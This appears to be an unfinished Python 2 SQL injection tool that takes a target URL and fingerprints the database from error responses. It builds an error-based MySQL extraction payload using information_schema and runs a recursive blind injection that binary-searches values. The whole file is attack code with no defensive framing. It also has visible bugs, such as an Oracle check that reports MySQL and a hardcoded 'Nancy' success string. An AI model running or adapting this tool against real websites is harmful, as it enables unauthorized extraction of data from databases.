#-*- coding: utf-8 -*-
import httplib
import urllib
from urlparse import urlparse
import sys
import time
import argparse
import error_sql as error



parser = argparse.ArgumentParser()
parser.add_argument('-u', dest="url", required=True, action="store", help='SQL Injection Targeting URL')
parser.add_argument('-t', dest="table", required=False, default="", action="store", help='Table Name')
parser.add_argument('-c', dest="column", required=False, default="", action="store", help='Column Name')
args    =   parser.parse_args()


headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.02883.87 Safari/537.36",
     "Conetent-type": "application/x-www-form-urlencoded",
     "Accept": "text/html",
     "Connection": "keep-alive"
}

tmp_url      =   urlparse(args.url)
scheme       =   tmp_url.scheme
domain       =   tmp_url.netloc
path         =   tmp_url.path
tmp_params   =   tmp_url.query
tmp_params   =   tmp_params.split("=")[0]
conn    =   httplib.HTTPConnection(domain,"80")

tmp_count = 0
delims  =   "!~!~!"


def httpreq(request_param):
    params     = plus_white(tmp_params+"="+request_param)
    conn.request("GET",path+"?"+params,None,headers)
    response = conn.getresponse().read()
    time.sleep(0.1)

    return response


def check_dbms():
    ck_dbms = httpreq("'")

    if ck_dbms.find('MySQL') != -1:
        cn_dbms = 'MYSQL'
        print "[Info] It's database looks like '" + cn_dbms + "'"
        return cn_dbms

    elif ck_dbms.find('mssql') != -1:
        cn_dbms = 'MSSQL'
        print "[Info] It's database looks like '" + cn_dbms + "'"
        return cn_dbms

    elif ck_dbms.find('ORA') != -1:
        cn_dbms = 'MySQL'
        print "[Info] It's database looks like '" + cn_dbms + "'"
        return cn_dbms

    else:
        print "[Info] Couldn't Assume database"
        return -1


def error_httpreq(vuln_part):

    vuln_param = "=(select a from (select count(*),concat('"+delims+"',"+vuln_part+",'"+delims+"',floor(rand(0)*2))a from information_schema.tables group by a)b)%23"
    params     = tmp_params+plus_white(vuln_param)
    conn.request("GET",path+"?"+params,None,headers)
    response = conn.getresponse().read () #응답 값
    return response.split(delims)[1]

def blind_httpreq(min, max, query):

    mid = (min+max) / 2
    tmp_cnt = httpreq(query + ">" + str(mid))
    #print query + ">" + str(mid)

    if tmp_cnt.find('Nancy') > 0: #아직 노완벽벽
       cnt = 1
    else:
        cnt = 0

    if (max-min) <= 1:
        if cnt:
            return max
        else:
            return min

    if cnt:
        return blind_httpreq(mid,max,query)
    else:
        return blind_httpreq(min,mid,query)

def plus_white(query):
    return query.replace(' ','+')

